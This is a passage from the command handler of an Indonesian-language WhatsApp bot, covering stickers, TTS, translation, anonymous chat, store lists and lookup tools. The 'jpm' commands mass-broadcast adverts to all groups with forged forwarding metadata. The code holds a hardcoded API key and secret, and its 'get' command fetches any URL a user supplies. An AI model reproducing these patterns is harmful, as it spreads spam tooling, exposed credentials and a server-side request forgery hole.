				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} halo`)
				if (text.length > 20) return m.warning("Maksimal 20 karakter")
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					const ttp = require('./lib/text2picture')
					let tpp = await ttp.attp(text)
					var ttpp = await getBuffer(tpp[0].url)
					await vreden.imgToSticker(m.chat, ttpp, m, {
						packname: `Sticker Maker\nNomor Bot :`,
						author: `${botName}\n${ownnomor}`
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'emojimix': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				let [emoji1, emoji2] = text.split`+`
				if (!emoji1) return m.warning(`Contoh:\n${prefix + command} 😅+💩`)
				if (!emoji2) return m.warning(`Contoh:\n${prefix + command} 😅+💩`)
				try {
					let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
					for (let res of anu.results) {
						var emj = await getBuffer(res.url)
						let encmedia = await vreden.imgToSticker(m.chat, emj, m, {
							packname: `Sticker Maker\nNomor Bot :`,
							author: `${botName}\n${ownnomor}`,
							categories: res.tags
						})
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tts':
			case 'texttosound':
			case 'audio':
			case 'say': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} yaya`)
				var lang = text.split("--")[1]
				try {
					if (!lang) lang = 'id'
					long = 'id'

					function tts(text, long = 'id') {
						//console.log(lang, text)
						return new Promise((resolve, reject) => {
							try {
								let tts = gtts(long)
								let filePath = path.join(__dirname, './lib', (1 * new Date) + '.wav')
								tts.save(filePath, text, () => {
									resolve(fs.readFileSync(filePath))
									fs.unlinkSync(filePath)
								})
							} catch (e) {
								reject(e)
							}
						})
					}

					let res
					try {
						res = await tts(text, long)
					} catch (e) {
						m.reply(e + '')
						res = await tts(text)
					} finally {
						if (/texttosound/.test(command)) vreden.sendMessage(m.chat, {
							audio: res,
							mimetype: 'audio/mpeg'
						}, {
							quoted: m
						})
						if (/tts/.test(command)) vreden.sendMessage(m.chat, {
							audio: res,
							mimetype: 'audio/mpeg'
						}, {
							quoted: m
						})
						if (/audio/.test(command)) vreden.sendMessage(m.chat, {
							audio: res,
							mimetype: 'audio/mpeg'
						}, {
							quoted: m
						})
						if (/say/.test(command)) vreden.sendMessage(m.chat, {
							audio: res,
							mimetype: 'audio/mpeg',
							ptt: true
						}, {})
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'translate':
			case 'tr': {
				if (!text) return m.warning(`*Masukan Input Query!*\n\nContoh :

1. Kirim perintah ${prefix + command} *kode bahasa* *teks*
• Contoh:\n${prefix + command} id halo
2. Reply chat dengan caption ${prefix + command} *kode bahasa*
• Contoh:\n${prefix + command} id halo
Daftar bahasa yang di dukung : https://cloud.google.com/translate/docs/languages`)
				try {
					let teks = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
					translate(teks, {
						to: args[0]
					}).then((res) => {
						vreden.sendText(m.chat, `${res.text}`, m)
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break

			case 'anonymouschat': {
				if (m.isGroup) return m.warning('Fitur Tidak Dapat Digunakan Untuk Group!')
				m.reply(`Hi ${usersdb[m.sender].nama} Welcome To Anonymous Chat\n\n${prefix}start -- _mencari partner_`)
			}
			break
			case 'keluar':
			case 'leave': {
				if (m.isGroup) return m.warning('Fitur Tidak Dapat Digunakan Untuk Group!')
				try {
					this.anonymous = this.anonymous ? this.anonymous : {}
					let room = Object.values(this.anonymous).find(room => room.check(m.sender))
					if (!room) {
						m.reply(`Kamu Sedang Tidak Berada Di Sesi Anonymous\n\n${prefix}start -- _mencari partner_`)
						throw false
					}
					m.reply('Berhasil keluar dari anonymous chat')
					let other = room.other(m.sender)
					if (other) await vreden.sendText(other, `Partner Telah Meninggalkan Sesi Anonymous`, m)
					delete this.anonymous[room.id]
					break
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'mulai':
			case 'start': {
				if (m.isGroup) return m.warning('Fitur Tidak Dapat Digunakan Untuk Group!')
				try {
					this.anonymous = this.anonymous ? this.anonymous : {}
					if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
						m.reply(`Kamu Masih Berada Di dalam Sesi Anonymous\n\n${prefix}keluar -- _keluar dari sesi chat_`)
						throw false
					}
					let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
					if (room) {
						vreden.sendMessage(room.a, {
							text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`
						})
						room.b = m.sender
						room.state = 'CHATTING'
						m.reply(`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`)
					} else {
						let id = +new Date
						this.anonymous[id] = {
							id,
							a: m.sender,
							b: '',
							state: 'WAITING',
							check: function(who = '') {
								return [this.a, this.b].includes(who)
							},
							other: function(who = '') {
								return who === this.a ? this.b : who === this.b ? this.a : ''
							},
						}
						m.reply(`Mohon Tunggu Sedang Mencari Partner`)
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'next':
			case 'lanjut': {
				if (m.isGroup) return m.warning('Fitur Tidak Dapat Digunakan Untuk Group!')
				try {
					this.anonymous = this.anonymous ? this.anonymous : {}
					let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
					if (!romeo) {
						m.reply(`Kamu Sedang Tidak Berada Di Sesi Anonymous\n\n${prefix}start -- _mencari partner_`)
						throw false
					}
					let other = romeo.other(m.sender)
					if (other) await vreden.sendText(other, `Partner Telah Meninggalkan Sesi Anonymous`, m)
					delete this.anonymous[romeo.id]
					let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
					if (room) {
						vreden.sendMessage(room.a, {
							text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`
						})
						room.b = m.sender
						room.state = 'CHATTING'
						m.reply(`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`)
					} else {
						let id = +new Date
						this.anonymous[id] = {
							id,
							a: m.sender,
							b: '',
							state: 'WAITING',
							check: function(who = '') {
								return [this.a, this.b].includes(who)
							},
							other: function(who = '') {
								return who === this.a ? this.b : who === this.b ? this.a : ''
							},
						}
						m.reply(`Mohon Tunggu Sedang Mencari Partner`)
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'sendprofile':
			case 'sendprofil': {
				if (m.isGroup) return m.warning('Fitur Tidak Dapat Digunakan Untuk Group!')
				try {
					this.anonymous = this.anonymous ? this.anonymous : {}
					let romoe = Object.values(this.anonymous).find(room => room.check(m.sender))
					if (!romoe) {
						m.reply(`⚠️ Kamu belum pernah memulai chat!\n\n${prefix}start -- _Mencari partner_`)
						throw false
					} else {
						let rms = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state == "CHATTING")
						var partnerJID = rms.other(m.sender)
						var res = await vreden.sendContact(partnerJID, [m.sender.split("@")[0]])
						vreden.sendMessage(m.chat, {
							text: '✅ Berhasil mengirim profil ke teman chat anda!'
						}, {
							quoted: m
						})
						vreden.sendMessage(partnerJID, {
							text: '👨👩 Teman chat kamu memberikan kontak profil nya!'
						}, {
							quoted: res
						})
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break

			//━━━━━━━━━━━━━━━[ STORE ]━━━━━━━━━━━━━━━━━//
			case 'jpm': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!text) return m.reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik\n\n_Ini JPM no tag_`)
				try {
					let getGroups = await vreden.groupFetchAllParticipating()
					let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
					let anu = groups.map((v) => v.id)
					let detik = `${text.split('|')[1] / 1000}`
					m.reply(`Mengirim JPM No Tag Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * detik} detik`)
					let button = [{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://api.whatsapp.com/send/?phone=${nomorOwner.split("@")[0]}\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${nomorOwner.split("@")[0]}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${gcwa}\",\"merchant_url\":\"${gcwa}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Information\",\"url\":\"${tiktok}\",\"merchant_url\":\"${tiktok}\"}`
						}
					]
					for (let xnxx of anu) {
						await sleep(text.split('|')[1])
						if (/image/.test(mime)) {
							media = await quoted.download()
							vreden.sendButtonImage(xnxx, media, button, `${text.split('|')[0]}\n`, footer, fhalo)
						} else {
							vreden.sendButtonText(xnxx, button, `${text.split('|')[0]}\n`, footer, fhalo)
						}
					}
					m.reply("*Sukses Kirim JPM ✅*")
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'jpm2': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!text) return m.reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
				try {
					let getGroups = await vreden.groupFetchAllParticipating()
					let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
					let anu = groups.map((v) => v.id)
					let detik = `${text.split('|')[1] / 1000}`
					m.reply(`Mengirim JPM Hidetag Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * detik} detik`)
					let button = [{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://api.whatsapp.com/send/?phone=${nomorOwner.split("@")[0]}\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${nomorOwner.split("@")[0]}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${gcwa}\",\"merchant_url\":\"${gcwa}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Information\",\"url\":\"${tiktok}\",\"merchant_url\":\"${tiktok}\"}`
						}
					]
					for (let xnxx of anu) {
						await sleep(text.split('|')[1])
						let jpdata = await vreden.groupMetadata(xnxx)
						let participanh = await jpdata.participants
						if (/image/.test(mime)) {
							media = await quoted.download()
							const uploadFile = {
								upload: vreden.waUploadToServer
							};
							var imageMessage = await prepareWAMessageMedia({
									image: media,
								},
								uploadFile,
							);
							let msg = generateWAMessageFromContent(xnxx, {
								viewOnceMessage: {
									message: {
										"messageContextInfo": {
											"deviceListMetadata": {},
											"deviceListMetadataVersion": 2
										},
										interactiveMessage: proto.Message.InteractiveMessage.create({
											contextInfo: {
												mentionedJid: participanh.map(a => a.id),
												forwardingScore: 9999999,
												isForwarded: true,
												forwardedNewsletterMessageInfo: {
													newsletterJid: idsaluran,
													newsletterName: `${namasaluran}`,
													serverMessageId: -1
												},
												businessMessageForwardInfo: {
													businessOwnerJid: vreden.decodeJid(vreden.user.id)
												},
											},
											body: proto.Message.InteractiveMessage.Body.create({
												text: text.split('|')[0]
											}),
											footer: proto.Message.InteractiveMessage.Footer.create({
												text: footxt
											}),
											header: proto.Message.InteractiveMessage.Header.create({
												title: "",
												subtitle: "Yahya Almuthahar",
												imageMessage: imageMessage.imageMessage,
												hasMediaAttachment: true
											}),
											nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
												buttons: button,
											})
										})
									}
								}
							}, {
								quoted: fhalo
							})

							vreden.relayMessage(xnxx, msg.message, {
								messageId: msg.key.id
							})
						} else {
							let msg = generateWAMessageFromContent(xnxx, {
								viewOnceMessage: {
									message: {
										"messageContextInfo": {
											"deviceListMetadata": {},
											"deviceListMetadataVersion": 2
										},
										interactiveMessage: proto.Message.InteractiveMessage.create({
											contextInfo: {
												mentionedJid: participanh.map(a => a.id),
												forwardingScore: 9999999,
												isForwarded: true,
												forwardedNewsletterMessageInfo: {
													newsletterJid: idsaluran,
													newsletterName: `${namasaluran}`,
													serverMessageId: -1
												},
												businessMessageForwardInfo: {
													businessOwnerJid: vreden.decodeJid(vreden.user.id)
												},
											},
											body: proto.Message.InteractiveMessage.Body.create({
												text: text.split('|')[0]
											}),
											footer: proto.Message.InteractiveMessage.Footer.create({
												text: footxt
											}),
											header: proto.Message.InteractiveMessage.Header.create({
												title: "",
												subtitle: "Yahya Almuthahar",
												hasMediaAttachment: false
											}),
											nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
												buttons: button,
											})
										})
									}
								}
							}, {
								quoted: fhalo
							})

							await vreden.relayMessage(xnxx, msg.message, {
								messageId: msg.key.id
							})
						}
					}
					m.reply("*Sukses Kirim JPM Hidetag ✅*")
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'list':
			case 'store': {
				try {
					const keys = Object.keys(chatsdb[m.chat].liststore);
					if (keys.length === 0) return m.warning(`Belum ada list message di grup`)
					let teks = `Halo @${m.sender.split("@")[0]} berikut beberapa list yang tersedia saat ini.\n\n`
					const result = [];
					const list = [];
					keys.forEach(key => {
						result.push({
							key: key
						});
						list.push({
							header: capitalizeWords(key) + " 🛒",
							title: "klik to show product",
							id: key
						})
					});
					for (let i of result) {
						teks += `- ${i.key.toUpperCase()}\n`
					}
					teks += `\n_Klik untuk melihat_\n_store produknya_`
					let button = [{
						"name": "single_select",
						"buttonParamsJson": `{\n\"title\": \"Store List🛍️\",\n\"sections\": [\n{\n\"title\": \"Eksplorasi Semua Store Official 🔥\",\n\"highlight_label\": \"Teratas\",\n\"rows\": ${JSON.stringify(list)}\n}\n]\n}`
					}]
					vreden.sendButtonImage(m.chat, {
						url: `https://pomf2.lain.la/f/xskm1xvg.jpg`
					}, button, teks, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'dellist': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				try {
					const keys = Object.keys(chatsdb[m.chat].liststore);
					if (keys.length === 0) return m.warning(`Belum ada list message di database`)
					if (!text) return m.warning(`Gunakan dengan cara ${prefix + command} *key*\n\n_Contoh_\n\n${prefix + command} hello`)
					if (!chatsdb[m.chat].liststore[text]) return m.warning(`Maaf, untuk key *${text}* belum terdaftar di group ini`)
					delete chatsdb[m.chat].liststore[text]
					m.reply(`Sukses delete list message dengan key *${q}*`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'addlist': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				var args1 = q.split("|")[0].toLowerCase()
				var args2 = q.split("|")[1]
				if (!q.includes("|")) return m.warning(`Gunakan dengan cara ${prefix+command} *key|response*\n\n_Contoh_\n\n${prefix+command} tes|apa`)
				if (chatsdb[m.chat].liststore[args1]) return m.warning(`List respon dengan key : *${args1}* sudah ada di group ini.`)
				try {
					if (/image/.test(mime)) {
						let media = await vreden.downloadAndSaveMediaMessage(quoted)
						const url = await pomfCDN(media)
						chatsdb[m.chat].liststore[args1] = {
							key: args1,
							response: args2,
							img: url,
							video: ""
						}
						m.reply(`Sukses set list message dengan key : *${args1}*`)
					} else if (/video/.test(mime)) {
						let media = await vreden.downloadAndSaveMediaMessage(quoted)
						const url = await pomfCDN(media)
						chatsdb[m.chat].liststore[args1] = {
							key: args1,
							response: args2,
							img: "",
							video: url
						}
						m.reply(`Sukses set list message dengan key : *${args1}*`)
					} else {
						chatsdb[m.chat].liststore[args1] = {
							key: args1,
							response: args2,
							img: "",
							video: ""
						}
						m.reply(`Sukses set list message dengan key : *${args1}*`)
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'updatelist':
			case 'update': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				var args1 = q.split("|")[0].toLowerCase()
				var args2 = q.split("|")[1]
				if (!q.includes("|")) return m.warning(`Gunakan dengan cara ${prefix+command} *key|response*\n\n_Contoh_\n\n${prefix+command} tes|apa`)
				if (!chatsdb[m.chat].liststore[args1]) return m.warning(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
				try {
					if (/image/.test(mime)) {
						let media = await vreden.downloadAndSaveMediaMessage(quoted)
						const url = await pomfCDN(media)
						chatsdb[m.chat].liststore[args1] = {
							key: args1,
							response: args2,
							img: url,
							video: ""
						}
						m.reply(`Sukses update respon list dengan key *${args1}*`)
					} else if (/video/.test(mime)) {
						let media = await vreden.downloadAndSaveMediaMessage(quoted)
						const url = await pomfCDN(media)
						chatsdb[m.chat].liststore[args1] = {
							key: args1,
							response: args2,
							img: "",
							video: url
						}
						m.reply(`Sukses update respon list dengan key *${args1}*`)
					} else {
						chatsdb[m.chat].liststore[args1] = {
							key: args1,
							response: args2,
							img: "",
							video: ""
						}
						m.reply(`Sukses update respon list dengan key *${args1}*`)
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tambah': {
				if (!text.includes('+')) return m.warning(`Gunakan dengan cara ${prefix+command} *angka* + *angka*\n\n_Contoh_\n\n${prefix+command} 1+2`)
				try {
					arg = args.join(' ')
					atas = arg.split('+')[0]
					bawah = arg.split('+')[1]
					var nilai_one = Number(atas)
					var nilai_two = Number(bawah)
					m.reply(`${nilai_one + nilai_two}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'kurang': {
				if (!text.includes('-')) return m.warning(`Gunakan dengan cara ${prefix+command} *angka* - *angka*\n\n_Contoh_\n\n${prefix+command} 1-2`)
				try {
					arg = args.join(' ')
					atas = arg.split('-')[0]
					bawah = arg.split('-')[1]
					var nilai_one = Number(atas)
					var nilai_two = Number(bawah)
					m.reply(`${nilai_one - nilai_two}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'kali': {
				if (!text.includes('*')) return m.warning(`Gunakan dengan cara ${prefix+command} *angka* * *angka*\n\n_Contoh_\n\n${prefix+command} 1*2`)
				try {
					arg = args.join(' ')
					atas = arg.split('*')[0]
					bawah = arg.split('*')[1]
					var nilai_one = Number(atas)
					var nilai_two = Number(bawah)
					m.reply(`${nilai_one * nilai_two}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'bagi': {
				if (!text.includes('/')) return m.warning(`Gunakan dengan cara ${prefix+command} *angka* / *angka*\n\n_Contoh_\n\n${prefix+command} 1/2`)
				try {
					arg = args.join(' ')
					atas = arg.split('/')[0]
					bawah = arg.split('/')[1]
					var nilai_one = Number(atas)
					var nilai_two = Number(bawah)
					m.reply(`${nilai_one / nilai_two}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'setproses':
			case 'setp': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
				chatsdb[m.chat].setproses = text
				m.reply(`✅ Done set proses!`)
			}
			break
			case 'delsetproses':
			case 'delsetp': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!chatsdb[m.chat].setproses) return m.warning(`Belum ada set proses di gc ini`)
				chatsdb[m.chat].setproses = false
				m.reply(`Sukses delete set proses`)
			}
			break
			case 'setdone': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
				chatsdb[m.chat].setdone = text
				m.reply(`Sukses set done!`)
			}
			break
			case 'delsetdone':
			case 'delsetd': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!chatsdb[m.chat].setdone) return m.warning(`Belum ada set done di gc ini`)
				chatsdb[m.chat].setdone = false
				m.reply(`Sukses delete set done`)
			}
			break
			//▢━━━━━━━━━━━━━━「 TOOLS COMMAND 」━━━━━━━━━━━━━━▢
			case 'gempa':
			case 'infogempa': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let gempe = await gempa()
					vreden.sendMessage(m.chat, {
						image: {
							url: gempe.data.imagemap
						},
						caption: `*乂 INFO - GEMPA*\n\nWaktu : ${gempe.data.waktu}\nMagnitude : ${gempe.data.magnitude}\nKedalaman : ${gempe.data.kedalaman}\nKoordinat : ${gempe.data.lintang_bujur}\nLokasi : ${gempe.data.wilayah}\nDirasakan : ${gempe.data.dirasakan}\n\nData Berdasarkan: https://www.bmkg.go.id/gempabumi/gempabumi-terkini.bmkg`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'get': {
				if (!/^https?:\/\//.test(text)) return m.warning('*Masukan URL nya!*\n\nContoh:\n.get https://api.vreden.my.id/api/ytmp3?url=https://youtube.com/watch?v=YBnxAP6qst4');
				try {

					const data = await axios.get(text);
					const contentType = data.headers["content-type"];

					if (contentType.startsWith('image/')) {
						vreden.sendMessage(m.chat, {
							image: {
								url: text
							},
							caption: `${text}\n\n*Headers Respons:*\n${Object.entries(data.headers).map(([key, value]) => `*${key}:* ${value}`).join('\n')}`
						}, {
							quoted: m
						});
					} else if (contentType.startsWith('video/')) {
						vreden.sendMessage(m.chat, {
							video: {
								url: text
							},
							caption: `${text}\n\n*Headers Respons:*\n${Object.entries(data.headers).map(([key, value]) => `*${key}:* ${value}`).join('\n')}`
						}, {
							quoted: m
						});
					} else if (contentType.startsWith('audio/')) {
						vreden.sendMessage(m.chat, {
							audio: {
								url: text
							},
							mimetype: 'audio/mpeg'
						}, {
							quoted: m
						});
					} else {
						m.sendForward(util.format(data.data))
						// Fungsi untuk menyimpan file dengan tipe konten asli
						const saveFileToDisk = async (url, outputPath) => {
							try {
								const mime = require('mime-types');
								const response = await axios.get(url, {
									responseType: 'arraybuffer'
								});
								const contentType = response.headers['content-type'];
								const ext = mime.extension(contentType);
								const filePath = outputPath + (ext ? `.${ext}` : '');

								return new Promise((resolve, reject) => {
									fs.writeFile(filePath, response.data, (err) => {
										if (err) {
											reject(err);
										} else {
											resolve({
												file: filePath,
												ext: ext,
												mime: contentType
											});
										}
									});
								});
							} catch (error) {
								throw error;
							}
						};

						try {
							const buffer = await saveFileToDisk(text, path.join(__dirname, 'sticker/get-data'));
							await sleep(2000); // Pastikan fungsi sleep() tersedia di konteks ini
							vreden.sendMessage(m.chat, {
								document: fs.readFileSync(buffer.file),
								mimetype: buffer.mime,
								fileName: "get-data." + buffer.ext
							}, {
								quoted: m
							});

							fs.unlinkSync(buffer.file); // Hapus file setelah dikirim
						} catch (error) {
							console.error('Gagal menyimpan atau mengirim file:', error);
						}
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}

			break;
			case 'apikey': {
				if (!isCreator) return m.tolak('Khusus Owner Bot')
				if (!q) return m.warning(`Contoh: ${prefix+command} 62xxxx`)
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (!users) return m.warning(`Contoh: ${prefix+command} 62xxxx`)
				try {
					let api = await fetchJson(`https://skizo.tech/api/checkapikey?phone=${users}&secret=bejo112`)
					let respon = `乂 SETTING APIKEY

*Apikey:* ${api.apikey}
*Number:* ${api.phone}
*Secret:* ${api.secret}
*Banned:* ${api.banned ? 'Terbanned' : "Tidak"}
*Role:* ${api.role}
*Limit:* ${api.limit}
*Limit Premium:* ${api.limitpremium}
*Akses:* ${api.access}
*Hit Total:* ${api.consume_limit}
*Hit Today:* ${api.consume_limit_today}
*Akses Today:* ${api.access_today}
*Digunakan:* ${api.last_date_access}
*Register:* ${api.formatted.registered_at}
*Expired:* ${api.formatted.expired}
*Time Used:* ${api.formatted.last_access}
*IP Access:*
`
					for (let ress of api.ip_access) {
						respon += `\n- *IP Access:* ${ress.ip_address}
- *Limit:* ${ress.access}
- *Digunakan:* ${ress.formatted.last_access}
────────────────────
`
					}
					m.sendForward(respon)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'whois': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!q) return m.warning(`Contoh: ${prefix+command} link`)
				if (budy.match(`/|https|http|:`)) return m.warning(`Masukan domain saja\n\n*Contoh:*\n\n.whois google.com`)
				async function whois(url) {
					try {
						const {
							data: html
						} = await axios.get('https://who.is/whois/' + url);
						const $ = cheerio.load(html);

						const data = $('.queryResponseBodyRow').map((_, element) => {
							const domain = $(element).find('.col-md-8.queryResponseBodyValue a').text();
							const ip = $(element).find('.col-md-4.queryResponseBodyValue a').text();
							return domain && ip ? {
								domain,
								ip
							} : null;
						}).get();

						const whoisInfo = $('pre').text().trim();

						const expiresOn = $("div:contains('Expires On')").next('.queryResponseBodyValue').text().trim() || null;
						const registeredOn = $("div:contains('Registered On')").next('.queryResponseBodyValue').text().trim() || null;
						const updatedOn = $("div:contains('Updated On')").next('.queryResponseBodyValue').text().trim() || null;

						return {
							domains: data,
							whoisInfo,
							expiresOn,
							registeredOn,
							updatedOn
						};
					} catch (error) {
						console.error('Error fetching data:', error);
						return null;
					}
				}
				try {
					let whos = await whois(text)
					let teks = '*乂 WHOIS DOMAIN*\n\n*Nameserver:*\n'
					for (let hasil of whos.domains) {
						teks += `NS: ${hasil.domain}
IP: ${hasil.ip}

`
					}
					teks += `
────────────────────

*Info Whois:* ${whos.whoisInfo ? whos.whoisInfo : "tadak"}
*Registered:* ${whos.registeredOn ? whos.registeredOn : "-"}
*Updated:* ${whos.updatedOn ? whos.updatedOn : "-"}
*Expired:* ${whos.expiresOn ? whos.expiresOn : "-"}

`
					m.sendForward(teks)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tempmail': {
				if (!text) return m.warning(`*Example:*\n${prefix + command} create\n\n*Pilih Type Yang Ada:*\n- create\n- message\n- delete`)
				try {
					if (args[0] === "create") {
						vreden.secmail = vreden.secmail ? vreden.secmail : {}
						let data = await fetchJson("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
						let info = data[0].split('@')
						vreden.secmail[m.sender] = [
							info[0],
							info[1]
						]
						m.sendForward(`*乂 TEMPMAIL CREATE*

*Email:*
${data[0]}

*Login:*
${info[0]}

*Domain:*
${info[1]}

_Ketik *${prefix + command} message* Untuk mengecek inbox_`)
					} else if (args[0] === "message") {
						if (!vreden.secmail[m.sender]) return m.reply("Tidak ada email yang terpakai")
						let email = vreden.secmail[m.sender]
						let result = await fetchJson(`https://www.1secmail.com/api/v1/?action=getMessages&login=${email[0]}&domain=${email[1]}`)
						let teks = "*乂 TEMPMAIL INBOX*"
						let jmlh = result.length
						if (jmlh === 0) return m.reply("*KOSONG*" + "\n\n_Ketik *" + prefix + command + " delete* Untuk menghapus email_")
						for (let i = 0; i < jmlh; i++) {
							teks += `

*EMAIL [ ${i + 1} ]*

ID: ${result[i].id}
Dari: ${result[i].from}

Subject: ${result[i].subject}
Date: ${result[i].date}

________________________
`
						}
						m.sendForward(teks)
					} else if (args[0] === "delete") {
						if (!vreden.secmail[m.sender]) return m.reply("Tidak ada email yang terpakai")
						try {
							delete vreden.secmail[m.sender]
							m.sendForward("Email Dihapus!")
						} catch (error) {
							m.reply("Terjadi kesalahan!\n\n" + error)
						}
					} else {
						m.warning(`*Example:*\n${prefix + command} create\n\n*Pilih Type Yang Ada:*\n- create\n- message\n- delete`)
					}
				} catch (error) {
